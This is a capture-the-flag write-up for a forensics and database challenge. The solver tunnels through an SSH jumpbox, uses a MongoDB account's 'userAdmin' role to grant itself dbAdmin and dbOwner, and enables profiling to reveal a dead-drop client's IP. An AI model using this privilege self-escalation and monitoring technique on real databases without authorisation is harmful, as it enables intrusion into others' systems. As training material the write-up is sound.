# Task 6 - Follow the Data Part 2 - (Forensics, Databases, Exploitation)
```
While you were working, we found the small U.S. cellular provider which issued the SIM card recovered from the device: Blue Horizon Mobile.

As advised by NSA legal counsel we reached out to notify them of a possible compromise and shared the IP address you discovered. Our analysts explained that sophisticated cyber threat actors may use co-opted servers to exfiltrate data and Blue Horizon Mobile confirmed that the IP address is for an old unused database server in their internal network. It was unmaintained and (unfortunately) reachable by any device in their network.

We believe the threat actor is using the server as a "dead drop", and it is the only lead we have to find them. Blue Horizon has agreed to give you limited access to this server on their internal network via an SSH "jumpbox". They will also be sure not to make any other changes that might tip off the actor. They have given you the authority to access the system, but unfortunately they could not find credentials. So you only have access to the database directly on TCP port 27017

Use information from the device firmware, and (below) SSH jumpbox location and credentials to login to the database via an SSH tunnel and discover the IP address of the system picking up a dead drop. Be patient as the actor probably only checks the dead drop periodically. Note the jumpbox IP is 100.127.0.2 so don't report yourself by mistake


Downloads:

SSH host key to authenticate the jumpbox (optional) (jumpbox-ssh_host_ecdsa_key.pub)
SSH private key to authenticate to the jumpbox: user@external-support.bluehorizonmobile.com on TCP port 22 (jumpbox.key)
Enter the IP address (don't guess)
```


## Connection Commands
```
ssh -vvvv -o "IdentitiesOnly=yes" -i ~/.ssh/jumpbox.key -L 27017:100.107.142.158:27017  user@external-support.bluehorizonmobile.com

mongosh 'mongodb://maintenance:e34adee367a46a@localhost:27017/?authSource=snapshot-f2852ce48e77'
```

## Solution
Before this I had never used `mongodb`, so I went to [The MongoDB Documentation](https://www.mongodb.com/docs/manual/).
After connecting with `mongosh` I went to check the permissions that I had, and immediately thought that any role called `*Admin` seemed like really bad OPSec, so I went to see what `userAdmin` actually has permission to do.
```
test> use snapshot-f2852ce48e77
switched to db snapshot-f2852ce48e77
snapshot-f2852ce48e77> db.getUsers()
{
  users: [
    {
      _id: 'snapshot-f2852ce48e77.maintenance',
      userId: new UUID("5af6b873-e5fc-43a8-ad67-5cc76e0cf7b8"),
      user: 'maintenance',
      db: 'snapshot-f2852ce48e77',
      roles: [
        { role: 'userAdmin', db: 'snapshot-f2852ce48e77' },
        { role: 'readWrite', db: 'snapshot-f2852ce48e77' }
      ],
      mechanisms: [ 'SCRAM-SHA-1', 'SCRAM-SHA-256' ]
    }
  ],
  ok: 1
}
```

After looking at the docs again, it looked like `userAdmin` can grant additional roles, like [`dbAdmin` and `dbOwner`](https://www.mongodb.com/docs/manual/reference/built-in-roles/#mongodb-authrole-dbAdmin).
```
snapshot-f2852ce48e77> db.grantRolesToUser("maintenance", [{role: "dbAdmin", db: "snapshot-f2852ce48e77"}, {role: "dbOwner", db: "snapshot-f2852ce48e77"}, { role: 'enableSharding', db: 'snapshot-f2852ce48e77' },])
```

```
snapshot-f2852ce48e77> db.getUsers()
{
  users: [
    {
      _id: 'snapshot-f2852ce48e77.maintenance',
      userId: new UUID("5af6b873-e5fc-43a8-ad67-5cc76e0cf7b8"),
      user: 'maintenance',
      db: 'snapshot-f2852ce48e77',
      roles: [
        { role: 'userAdmin', db: 'snapshot-f2852ce48e77' },
        { role: 'enableSharding', db: 'snapshot-f2852ce48e77' },
        { role: 'dbAdmin', db: 'snapshot-f2852ce48e77' },
        { role: 'readWrite', db: 'snapshot-f2852ce48e77' },
        { role: 'dbOwner', db: 'snapshot-f2852ce48e77' }
      ],
      mechanisms: [ 'SCRAM-SHA-1', 'SCRAM-SHA-256' ]
    }
  ],
  ok: 1
}

```

Looking at the [table of "Permitted Actions"](https://www.mongodb.com/docs/manual/reference/built-in-roles/#mongodb-authrole-dbAdmin) for the `dbAdmin` role, one of the resources that `dbAdmin` has access to is `system.profile`. Looking around in the [Profiler Documentation](https://www.mongodb.com/docs/manual/tutorial/manage-the-database-profiler/) led me to find that changing the profiling level to `2` is supposed to collect data for all operations, which I assumed would include an authentication from a remote device and any transaction performed, like reading

```
snapshot-f2852ce48e77> db.setProfilingLevel(2)
{ was: 2, slowms: 1, sampleRate: 1, ok: 1 }
```

And then I proceeded to run this command to list out the contents of the `system.profile` collection
```
snapshot-f2852ce48e77> db.getCollection('system.profile').find()
```

Where I noticed that one of the fields, `client`, was an IP address. Please note that this was requeried while doing the writeup.
```json
  {
    op: 'query',
    ns: 'snapshot-f2852ce48e77.system.profile',
    command: {
      find: 'system.profile',
      filter: {},
      lsid: { id: new UUID("e05cbc8b-45bc-41db-88c3-0ed691abfab1") },
      '$db': 'snapshot-f2852ce48e77'
    },
    keysExamined: 0,
    docsExamined: 10,
    cursorExhausted: true,
    numYield: 0,
    nreturned: 10,
    queryHash: '17830885',
    queryFramework: 'classic',
    locks: {
      FeatureCompatibilityVersion: { acquireCount: { r: Long("1") } },
      Global: { acquireCount: { r: Long("1") } },
      Mutex: { acquireCount: { r: Long("1") } }
    },
    flowControl: {},
    responseLength: 9932,
    protocol: 'op_msg',
    millis: 0,
    planSummary: 'COLLSCAN',
    execStats: {
      stage: 'COLLSCAN',
      nReturned: 10,
      executionTimeMillisEstimate: 0,
      works: 11,
      advanced: 10,
      needTime: 0,
      needYield: 0,
      saveState: 0,
      restoreState: 0,
      isEOF: 1,
      direction: 'forward',
      docsExamined: 10
    },
    ts: ISODate("2023-12-11T02:49:42.937Z"),
    client: '100.127.0.2',
    appName: 'mongosh 2.0.2',
    allUsers: [ { user: 'maintenance', db: 'snapshot-f2852ce48e77' } ],
    user: 'maintenance@snapshot-f2852ce48e77'
  }
```


Then I inserted a document into the database, hoping that it might trigger the other device to collect data.
```
snapshot-f2852ce48e77> db.files.insertOne({"blah":"blah"})
```

Then after maybe 15-30ish minutes, I queried again and noticed an extra message that I completely missed before.

```
Type "it" for more
snapshot-f2852ce48e77> it
```


which eventually showed an operation with a different `client` value, which was the solution that I submitted
```
100.90.12.106
```
